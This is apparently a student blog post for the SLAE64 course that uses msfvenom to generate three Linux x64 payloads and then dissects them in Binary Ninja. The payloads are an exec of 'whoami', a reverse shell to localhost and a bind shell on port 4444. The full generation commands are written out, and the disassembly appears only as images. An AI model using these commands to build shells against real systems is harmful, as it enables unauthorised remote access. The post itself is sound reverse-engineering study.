Introduction
------------
In efforts to learn more about Binary Ninja, we will be taking apart three shellcode samples generated via `msfvenom`. Please note that disassemblers in general including Binary Ninja are fairly new to me and as such this will be a learning experience to me as much as it will be to you.

Shellcode I
-----------
First, we’ll look at `exec` option and generate payload that will run `whoami` command.

```sh
➜  ~ msfvenom -p linux/x64/exec CMD=whoami -f elf -o whoami
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 46 bytes
Final size of elf file: 166 bytes
Saved as: whoami
➜  ~ 
```

Will use the comment section in Binary Ninja to explain the shellcode as I feel it would be easier to digest this way.

![](/assets/images/Analyzing_Msfvenom_Payloads_with_Binary_Ninja_linux_x86_64/exec .png)

Shellcode II
------------
Next, we will be looking at stage-less reverse shell with an IP address of localhost and default port of `4444`.

```sh
➜  ~ msfvenom -p linux/x64/shell_reverse_tcp lhost=127.0.0.1 -f elf -o RevShell
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: RevShell
➜  ~ 
```

Let’s disassemble it.

![](/assets/images/Analyzing_Msfvenom_Payloads_with_Binary_Ninja_linux_x86_64/Reverse-Shell.png)

Shellcode III
-------------
Lastly, will dissect stage-less bind shell that listen on all interfaces on port `4444` (default).

```sh
➜  ~ msfvenom -p linux/x64/shell_bind_tcp -f elf -o BindShell
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 86 bytes
Final size of elf file: 206 bytes
Saved as: BindShell
➜  ~ 
```

And the analysis.

![](/assets/images/Analyzing_Msfvenom_Payloads_with_Binary_Ninja_linux_x86_64/Bind-Shell.png)

Closing Thoughts
----------------
I really like Binary Ninja and plan on using it more often moving forward. All of the above binaries are available on my [github](https://github.com/ihack4falafel/SLAE64/tree/master/Assignment%205). Feel free to contact me for questions via Twitter [@ihack4falafel](https://twitter.com/ihack4falafel).

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certiﬁcation:

[http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html)

Student ID: SLAE64–1579
